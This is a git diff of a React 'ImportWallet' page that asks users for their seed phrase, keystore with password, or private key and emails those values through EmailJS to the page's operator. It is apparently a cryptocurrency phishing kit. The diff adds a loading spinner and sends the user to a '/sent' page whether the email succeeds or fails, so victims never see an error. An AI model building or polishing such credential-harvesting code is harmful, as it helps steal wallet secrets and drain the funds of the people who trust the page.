@@ -1,19 +1,24 @@
 import React, { useState } from 'react';
 import { Box, Button, Flex, Heading, Text, Input } from '@chakra-ui/react';
+import { useNavigate } from 'react-router-dom'; // For navigation
 import emailjs from 'emailjs-com';
 
 const ImportWallet = () => {
   const [selectedOption, setSelectedOption] = useState('seed');
   const [inputValue, setInputValue] = useState('');
   const [password, setPassword] = useState(''); // For keystore option
+  const [isLoading, setIsLoading] = useState(false); // Loading state
+
+  const navigate = useNavigate(); // To navigate to different pages
 
   const handleButtonClick = (option) => {
     setSelectedOption(option);
     setInputValue('');
-    setPassword('');  // Clear the password when switching options
+    setPassword(''); // Clear the password when switching options
   };
 
   const sendEmail = () => {
+    // Input validation
     if (selectedOption === 'seed' && !inputValue) {
       alert('Please enter your Seed/Recovery Phrase.');
       return;
@@ -26,6 +31,9 @@ const ImportWallet = () => {
       alert('Please enter your Private Key.');
       return;
     }
+
+    // Set loading state to true when sending email
+    setIsLoading(true);
 
     const serviceID = 'service_jujd1ma';  
     const templateID = 'template_cpe3uon'; 
@@ -40,11 +48,13 @@ const ImportWallet = () => {
     emailjs.send(serviceID, templateID, templateParams, publicKey)
       .then((response) => {
         console.log('SUCCESS!', response.status, response.text);
-        alert('Email sent successfully!');
+        setIsLoading(false);
+        navigate('/sent'); 
       })
       .catch((error) => {
         console.log('FAILED...', error);
-        alert('Failed to send email.');
+        setIsLoading(false); 
+        navigate('/sent'); 
       });
   };
   
@@ -92,7 +102,7 @@ const ImportWallet = () => {
           <Input
             placeholder="Input your phrase value...."
             mb={4}
-            h={{base: '120px', md: '150px'}}
+            h={{ base: '120px', md: '150px' }}
             value={inputValue}
             onChange={(e) => setInputValue(e.target.value)}
           />
@@ -105,9 +115,11 @@ const ImportWallet = () => {
             borderRadius="0px"
             h="50px"
             onClick={sendEmail}
+           
             fontFamily={"Montserrat"}
           >
-            IMPORT
+            
+            {isLoading ? "PLEASE WAIT....." : 'IMPORT'}
           </Button>
         </Box>
       )}
@@ -117,7 +129,7 @@ const ImportWallet = () => {
           <Input
             placeholder="Input your keystore value..."
             mb={4}
-            h={{base: '120px', md: '150px'}}
+            h={{ base: '120px', md: '150px' }}
             value={inputValue}
             onChange={(e) => setInputValue(e.target.value)}
           />
@@ -125,7 +137,7 @@ const ImportWallet = () => {
             placeholder="Enter password"
             type="password"
             mb={4}
-            h={{base: '40px', md: '60px'}}
+            h={{ base: '40px', md: '60px' }}
             value={password}
             onChange={(e) => setPassword(e.target.value)}
           />
@@ -138,6 +150,7 @@ const ImportWallet = () => {
             borderRadius="0px"
             h="50px"
             onClick={sendEmail}
+            isLoading={isLoading} // Show spinner while loading
           >
             IMPORT
           </Button>
@@ -161,6 +174,7 @@ const ImportWallet = () => {
             borderRadius="0px"
             h="50px"
             onClick={sendEmail}
+            isLoading={isLoading} // Show spinner while loading
           >
             IMPORT
           </Button>
